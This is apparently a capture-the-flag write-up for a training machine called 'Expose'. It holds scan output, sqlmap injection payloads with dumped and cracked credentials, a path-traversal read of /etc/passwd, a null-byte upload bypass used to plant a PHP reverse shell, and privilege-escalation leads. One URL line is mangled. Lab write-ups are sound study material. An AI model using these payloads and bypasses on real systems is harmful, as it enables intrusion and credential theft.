@@ -1,0 +1,597 @@
+Expose Challenge
+
+IP address:10.10.233.37
+
+Information gathering:
+
+Rustscan:
+┌──(gabi㉿kali)-[~/Documents/THM/Challenges/Expose]
+└─$ rustscan -a 10.10.233.37
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: http://discord.skerritt.blog         :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+RustScan: Because guessing isn't hacking.
+
+[~] The config file is expected to be at "/home/gabi/.rustscan.toml"
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+Open 10.10.233.37:22
+Open 10.10.233.37:21
+Open 10.10.233.37:53
+Open 10.10.233.37:1883
+Open 10.10.233.37:1337
+[~] Starting Script(s)
+[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-19 09:51 EDT
+Initiating Ping Scan at 09:51
+Scanning 10.10.233.37 [4 ports]
+Completed Ping Scan at 09:51, 0.11s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 09:51
+Completed Parallel DNS resolution of 1 host. at 09:51, 13.00s elapsed
+DNS resolution of 1 IPs took 13.00s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
+Initiating SYN Stealth Scan at 09:51
+Scanning 10.10.233.37 [5 ports]
+Discovered open port 21/tcp on 10.10.233.37
+Discovered open port 53/tcp on 10.10.233.37
+Discovered open port 22/tcp on 10.10.233.37
+Discovered open port 1883/tcp on 10.10.233.37
+Discovered open port 1337/tcp on 10.10.233.37
+Completed SYN Stealth Scan at 09:51, 0.18s elapsed (5 total ports)
+Nmap scan report for 10.10.233.37
+Host is up, received reset ttl 63 (0.13s latency).
+Scanned at 2025-03-19 09:51:16 EDT for 1s
+
+PORT     STATE SERVICE REASON
+21/tcp   open  ftp     syn-ack ttl 63
+22/tcp   open  ssh     syn-ack ttl 63
+53/tcp   open  domain  syn-ack ttl 63
+1337/tcp open  waste   syn-ack ttl 63
+1883/tcp open  mqtt    syn-ack ttl 63
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 13.40 seconds
+           Raw packets sent: 9 (372B) | Rcvd: 6 (260B)
+
+NMAP:
+
+           PORT   STATE SERVICE REASON         VERSION
+           21/tcp open  ftp     syn-ack ttl 63 vsftpd 2.0.8 or later
+           |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+           | ftp-syst: 
+           |   STAT: 
+           | FTP server status:
+           |      Connected to ::ffff:10.8.76.182
+           |      Logged in as ftp
+           |      TYPE: ASCII
+           |      No session bandwidth limit
+           |      Session timeout in seconds is 300
+           |      Control connection is plain text
+           |      Data connections will be plain text
+           |      At session startup, client count was 2
+           |      vsFTPd 3.0.3 - secure, fast, stable
+           |_End of status
+           22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+           | ssh-hostkey: 
+           |   3072 dc:9f:18:5c:d2:de:26:65:bf:06:e6:03:33:3b:5c:49 (RSA)
+           | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDN+2FIAfd3RIpZdqbnBpNPUx1d4bjr2TpQ6zevRQxGw1DDUurtUgjOb14EzyhQAEg9zu1z50MfR0UaszhGpcQEAo/MwU78Q0PO3lMCTqP3MWgpc1NWA013nT2LeG0zTkD4Qg16R+DhZtLPYTMacEJ5ORwqFOAtbqQuE97mNuRw7PU+rHsxvGgEevcqAh3WpYXI9jGtg611MpfWT1lbDpV1Ix8Xx1Dw9OpjvCxf0HUmiRAF/KnHwskPs06kO09rIlxKLqNtLn6xT2y0o9W5BFXdm56n7KqPKCxKrwmfw+q3W8+q1YhSCdxIkvP+yTZD3WYwDyErHtqhsdQA2yYkbp+M4EYwH4UdyklqeFeXmfWyTiWEIoAu75PuriSjn63RFZ4hntWk055MYl+xbY4NIhdhEZPIj0ECA4Ynff3AdWDrR2l5e3GbrqAQUCtC4N7HRoyH+E5jVICGJrGQPaO1hmHfsOh1E8y2jfeQxB/YVI7UY1S+xOiYsIrctAQW1Dndhm8=
+           |   256 25:81:65:99:5d:ab:84:c1:69:2f:50:5f:c3:a4:58:28 (ECDSA)
+           | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAIcNzAKP8dGepC3FlBdmfxP1u5YnJIqonG3fugazu0qkrE6ymw4lgGKwwQeklpEL/Qzp3zzr5AVONHTCpYlAJw=
+           |   256 7f:b4:0e:09:5e:d2:1b:fc:66:1d:d7:1f:c3:74:2a:38 (ED25519)
+           |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM+JfOGe+kEw8NTZT1732gdzM7poEfRYe+6kN1GehJrE
+           53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.16.1 (Ubuntu Linux)
+           | dns-nsid: 
+           |_  bind.version: 9.16.1-Ubuntu
+           No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+           TCP/IP fingerprint:
+           OS:SCAN(V=7.94SVN%E=4%D=3/19%OT=21%CT=1%CU=30162%PV=Y%DS=2%DC=T%G=Y%TM=67DA
+           OS:CF15%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)SEQ(S
+           OS:P=103%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI
+           OS:=Z%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST
+           OS:11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=
+           OS:F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T
+           OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
+           OS:%O=%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40
+           OS:%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%
+           OS:Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=O%
+           OS:A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T7(R=Y%D
+           OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL
+           OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+           Uptime guess: 38.695 days (since Sat Feb  8 16:24:02 2025)
+           Network Distance: 2 hops
+           TCP Sequence Prediction: Difficulty=259 (Good luck!)
+           IP ID Sequence Generation: All zeros
+           Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+           TRACEROUTE (using port 587/tcp)
+           HOP RTT       ADDRESS
+           1   107.27 ms 10.8.0.1
+           2   107.56 ms 10.10.233.37
+
+           NSE: Script Post-scanning.
+           NSE: Starting runlevel 1 (of 3) scan.
+           Initiating NSE at 10:05
+           Completed NSE at 10:05, 0.00s elapsed
+           NSE: Starting runlevel 2 (of 3) scan.
+           Initiating NSE at 10:05
+           Completed NSE at 10:05, 0.00s elapsed
+           NSE: Starting runlevel 3 (of 3) scan.
+           Initiating NSE at 10:05
+           Completed NSE at 10:05, 0.00s elapsed
+           Read data files from: /usr/share/nmap
+           OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+           Nmap done: 1 IP address (1 host up) scanned in 751.81 seconds
+                      Raw packets sent: 2001 (95.250KB) | Rcvd: 4268 (817.720KB)
+
+
+
+
+
+            ftp 10.10.233.37
+Connected to 10.10.233.37.
+220 Welcome to the Expose Web Challenge.
+Name (10.10.233.37:gabi): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||6865|)
+150 Here comes the directory listing.
+226 Directory send OK.
+
+
+
+dirb:
+
+http://10.10.233.37:1337/admin_101/
+
+
+
+──(gabi㉿kali)-[~/Documents/THM/Challenges/Expose]
+└─$ dirb http://10.10.233.37:1337 /usr/share/wordlists/dirb/common.txt
+
+
+==> DIRECTORY: http://10.10.233.37:1337/admin/
++ http://10.10.233.37:1337/index.php (CODE:200|SIZE:91)   
+
+
+==> DIRECTORY: http://10.10.233.37:1337/javascript/
+
+
+=> DIRECTORY: http://10.10.233.37:1337/phpmyadmin/
++ http://10.10.233.37:1337/server-status (CODE:403|SIZE:279)                
+                                                                
+
+"/phpmyadmin/",arg_separator:"&",PMA_VERSION:"4.9.5deb2",auth_type:"cookie",user:"root"})                                                                 
+
+==> DIRECTORY: http://10.10.233.37:1337/admin/assets/                
++ http://10.10.233.37:1337/admin/index.php (CODE:200|SIZE:1534)                                                  
+
+
+
+
+NIKTO:
+
+┌──(gabi㉿kali)-[~/Documents/THM/Challenges/Expose]
+└─$ nikto -h 10.10.233.37:1337                      
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.10.233.37
++ Target Hostname:    10.10.233.37
++ Target Port:        1337
++ Start Time:         2025-03-19 10:09:57 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.41 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /admin/: This might be interesting.
++ /phpmyadmin/changelog.php: Cookie goto created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ /phpmyadmin/changelog.php: Cookie back created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ /phpmyadmin/changelog.php: Uncommon header 'x-ob_mode' found, with contents: 1.
++ /admin/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
+
+
+there is another login on :1337/admin_101/
+
+
+capture the log in request with burpsuite
+
+use sql map to see if we can do something
+
+
+gabi@kali: sqlmap -r req -dump
+
+
+       ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.8.11#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:42:49 /2025-03-19/
+
+[10:42:49] [INFO] parsing HTTP request from 'req'
+[10:42:50] [INFO] testing connection to the target URL
+[10:42:51] [INFO] checking if the target is protected by some kind of WAF/IPS
+[10:42:51] [WARNING] request URI is marked as too long by the target. you are advised to try a switch '--no-cast' and/or '--no-escape'
+[10:42:51] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
+are you sure that you want to continue with further target testing? [Y/n] y
+[10:42:58] [WARNING] please consider usage of tamper scripts (option '--tamper')
+[10:42:58] [INFO] testing if the target URL content is stable
+[10:42:58] [INFO] target URL content is stable
+[10:42:58] [INFO] testing if POST parameter 'email' is dynamic
+[10:42:58] [INFO] POST parameter 'email' appears to be dynamic
+[10:42:59] [INFO] heuristic (basic) test shows that POST parameter 'email' might be injectable (possible DBMS: 'MySQL')
+[10:42:59] [INFO] heuristic (XSS) test shows that POST parameter 'email' might be vulnerable to cross-site scripting (XSS) attacks
+[10:42:59] [INFO] testing for SQL injection on POST parameter 'email'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
+[10:43:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[10:43:03] [WARNING] reflective value(s) found and filtering out
+[10:43:05] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[10:43:05] [INFO] testing 'Generic inline queries'
+[10:43:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[10:43:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[10:43:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[10:43:32] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[10:43:49] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[10:44:07] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[10:44:21] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[10:44:40] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[10:44:55] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[10:44:57] [INFO] POST parameter 'email' appears to be 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable                                                                                                                     
+[10:44:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[10:44:57] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[10:44:58] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[10:44:58] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[10:44:58] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[10:44:58] [INFO] POST parameter 'email' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
+[10:44:58] [INFO] testing 'MySQL inline queries'
+[10:44:58] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[10:44:58] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[10:44:59] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[10:44:59] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[10:44:59] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[10:44:59] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[10:45:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[10:45:10] [INFO] POST parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[10:45:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[10:45:10] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[10:45:10] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[10:45:10] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[10:45:11] [INFO] target URL appears to have 4 columns in query
+
+
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
+[10:45:43] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[10:45:48] [INFO] target URL appears to be UNION injectable with 4 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
+[10:46:00] [INFO] testing 'MySQL UNION query (15) - 21 to 40 columns'
+[10:46:06] [INFO] testing 'MySQL UNION query (15) - 41 to 60 columns'
+[10:46:10] [INFO] testing 'MySQL UNION query (15) - 61 to 80 columns'
+[10:46:15] [INFO] testing 'MySQL UNION query (15) - 81 to 100 columns'
+POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 702 HTTP(s) requests:
+---
+Parameter: email (POST)
+    Type: boolean-based blind
+    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: email=hacker@root.thm' AND EXTRACTVALUE(2530,CASE WHEN (2530=2530) THEN 2530 ELSE 0x3A END)-- WGou&password=root
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: email=hacker@root.thm' AND GTID_SUBSET(CONCAT(0x71717a6a71,(SELECT (ELT(2623=2623,1))),0x71716b7a71),2623)-- cJWR&password=root
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=hacker@root.thm' AND (SELECT 5411 FROM (SELECT(SLEEP(5)))ajzI)-- ptNl&password=root
+---
+[10:46:26] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.6
+[10:46:28] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[10:46:28] [INFO] fetching current database
+[10:46:28] [INFO] retrieved: 'expose'
+[10:46:28] [INFO] fetching tables for database: 'expose'
+[10:46:29] [INFO] retrieved: 'config'
+[10:46:29] [INFO] retrieved: 'user'
+[10:46:29] [INFO] fetching columns for table 'config' in database 'expose'
+[10:46:30] [INFO] retrieved: 'id'
+[10:46:30] [INFO] retrieved: 'int'
+[10:46:30] [INFO] retrieved: 'url'
+[10:46:30] [INFO] retrieved: 'text'
+[10:46:30] [INFO] retrieved: 'password'
+[10:46:31] [INFO] retrieved: 'text'
+[10:46:31] [INFO] fetching entries for table 'config' in database 'expose'
+[10:46:31] [INFO] retrieved: '/file1010111/index.php'
+[10:46:31] [INFO] retrieved: '1'
+[10:46:31] [INFO] retrieved: '69c66901194a6486176e81f5945b8929'
+[10:46:31] [INFO] retrieved: '/upload-cv00101011/index.php'
+[10:46:32] [INFO] retrieved: '3'
+[10:46:32] [INFO] retrieved: '// ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z'
+[10:46:32] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+[10:46:54] [INFO] writing hashes to a temporary file '/tmp/sqlmap10op8zty33863/sqlmaphashes-wlxo6u08.txt' 
+do you want to crack them via a dictionary-based attack? [Y/n/q] y
+[10:46:57] [INFO] using hash method 'md5_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 
+
+[10:47:09] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] n
+[10:47:13] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[10:47:13] [INFO] starting 2 processes 
+[10:47:16] [INFO] cracked password 'easytohack' for hash '69c66901194a6486176e81f5945b8929'                                             
+Database: expose                                                                                                                        
+Table: config
+[2 entries]
++----+------------------------------+-----------------------------------------------------+
+| id | url                          | password                                            |
++----+------------------------------+-----------------------------------------------------+
+| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)       |
+| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
++----+------------------------------+-----------------------------------------------------+
+
+[10:47:24] [INFO] table 'expose.config' dumped to CSV file '/home/gabi/.local/share/sqlmap/output/10.10.233.37/dump/expose/config.csv'
+[10:47:24] [INFO] fetching columns for table 'user' in database 'expose'
+[10:47:24] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[10:47:25] [INFO] retrieved: 'id'
+[10:47:25] [INFO] retrieved: 'int'
+[10:47:26] [INFO] retrieved: 'email'
+[10:47:26] [INFO] retrieved: 'varchar(512)'
+[10:47:26] [INFO] retrieved: 'password'
+[10:47:26] [INFO] retrieved: 'varchar(512)'
+[10:47:27] [INFO] retrieved: 'created'
+[10:47:27] [INFO] retrieved: 'timestamp'
+[10:47:27] [INFO] fetching entries for table 'user' in database 'expose'
+[10:47:27] [INFO] retrieved: '2023-02-21 09:05:46'
+[10:47:28] [INFO] retrieved: 'hacker@root.thm'
+[10:47:28] [INFO] retrieved: '1'
+[10:47:28] [INFO] retrieved: 'VeryDifficultPassword!!#@#@!#!@#1231'
+Database: expose
+Table: user
+[1 entry]
++----+-----------------+---------------------+--------------------------------------+
+| id | email           | created             | password                             |
++----+-----------------+---------------------+--------------------------------------+
+| 1  | hacker@root.thm | 2023-02-21 09:05:46 | VeryDifficultPassword!!#@#@!#!@#1231 |
++----+-----------------+---------------------+--------------------------------------+
+
+[10:47:28] [INFO] table 'expose.`user`' dumped to CSV file '/home/gabi/.local/share/sqlmap/output/10.10.233.37/dump/expose/user.csv'
+[10:47:28] [WARNING] HTTP error codes detected during run:
+414 (Request-URI Too Long) - 1 times
+[10:47:28] [INFO] fetched data logged to text files under '/home/gabi/.local/share/sqlmap/output/10.10.233.37'
+
+[*] ending @ 10:47:28 /2025-03-19/
+
+
+
+
+we can use the password to log in, but there's nothing much going on
+
+
+we can instead go to http://10.10.233.37:1337/file1010111/index.php
+
+we are required a password: the passowrd is easytohack
+
+then we are welcomed by this message:
+Parameter Fuzzing is also important :) or Can you hide DOM elements? 
+
+
+
+there seems to be an lfi:
+
+http://10.10.233.37:1337/file1010111/index.php?file=index.php
+
+
+page is loaded multiple times.
+
+
+
+we can try to read etc/passwd/
+
+http://10.10.233.37:133http://10.10.233.37:1337/file1010111/index.php?file=../../../../etc/passwd/file1010111/index.php?file=../../../etc/passwd
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
+zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash
+
+ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+bind:x:115:122::/var/cache/bind:/usr/sbin/nologin
+Debian-snmp:x:116:123::/var/lib/snmp:/bin/false
+redis:x:117:124::/var/lib/redis:/usr/sbin/nologin
+mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin
+fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+
+
+now we have the user with z: zeamkish
+
+we can access http://10.10.233.37:1337/upload-cv00101011/index.php with zeamkish
+
+read the code :
+
+function validate(){
+
+ var fileInput = document.getElementById('file');
+  var file = fileInput.files[0];
+  
+  if (file) {
+    var fileName = file.name;
+    var fileExtension = fileName.split('.').pop().toLowerCase();
+    
+    if (fileExtension === 'jpg' || fileExtension === 'png') {
+      // Valid file extension, proceed with file upload
+      // You can submit the form or perform further processing here
+      console.log('File uploaded successfully');
+	  return true;
+    } else {
+      // Invalid file extension, display an error message or take appropriate action
+      console.log('Only JPG and PNG files are allowed');
+	  return false;
+    }
+  }
+}
+
+upload only accepts jpg and png
+
+we upload a jpg file to see if we can find the folder where it's stored. Looking into the web page source we find a folder and the file name:
+<h1>File uploaded successfully! Maybe look in source code to see the path<span style=" display: none;">in /upload_thm_1001 folder</span> <h1>
+
+
+visiting this: http://10.10.233.37:1337/upload-cv00101011//upload_thm_1001/, we can see the file that we just uploaded.
+
+clicking it, will open the file.
+
+now we can craft something
+
+since there is a weak upload restriction, we can uplpad a php shell. We use php-reverse-shell, and save it to badcat.phpD.jpg.
+
+we create a netcat listener, and then we use burp suite to bypass upload restriction. We will change D to null character(00)using burp. First we intercept the request, and we look for the name of the file we want to upload. Then we change the "D" in phpD to Null character(00). We then forward the request and finish the upload.
+
+We go then to the upload page, and click on the php file that we uploaded, and get a reverse shell.
+
+
+we get zeamkish ssh creds, so we can ssh to it:
+
+www-data@ip-10-10-132-201:/home$ cd zeamkish    
+www-data@ip-10-10-132-201:/home/zeamkish$ ls
+flag.txt  ssh_creds.txt
+www-data@ip-10-10-132-201:/home/zeamkish$ cat ssh_creds.txt
+SSH CREDS
+zeamkish
+easytohack@123
+www-data@ip-10-10-132-201:/home/zeamkish$
+
+
+
+
+┌──(gabi㉿kali)-[~/Documents/THM/Challenges/Expose]
+└─$ ssh zeamkish@10.10.132.201
+The authenticity of host '10.10.132.201 (10.10.132.201)' can't be established.
+ED25519 key fingerprint is SHA256:oF6naFsCJyfsyeaMUU/z5kHL0VHdU25U0nscb0CczYA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.132.201' (ED25519) to the list of known hosts.
+zeamkish@10.10.132.201's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1039-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Mar 20 14:06:11 UTC 2025
+
+  System load:  0.0               Processes:             131
+  Usage of /:   7.3% of 58.09GB   Users logged in:       0
+  Memory usage: 17%               IPv4 address for eth0: 10.10.132.201
+  Swap usage:   0%
+
+ * Ubuntu Pro delivers the most comprehensive open source security and
+   compliance features.
+
+   https://ubuntu.com/aws/pro
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Sun Jul  2 17:27:46 2023 from 10.10.83.109
+zeamkish@ip-10-10-132-201:~$ 
+
+
+zeamkish@ip-10-10-132-201:~$ ls
+flag.txt  ssh_creds.txt
+zeamkish@ip-10-10-132-201:~$ cat flag.txt
+THM{USER_FLAG_1231_EXPOSE}
+zeamkish@ip-10-10-132-201:~$ 
+
+running linpeas.sh on the victim machine we have a few solutions for possible priviledge escalation. 
+
+Vulnerable to CVE-2021-3560
+
+-rwsr-xr-x 1 root root 313K Apr 10  2020 /usr/bin/nano
+
+-rwsr-x--- 1 root zeamkish 313K Feb 18  2020 /usr/bin/find
+
+we can try to exploit the vulnerability, or use suid bites that are set to nano or find
+
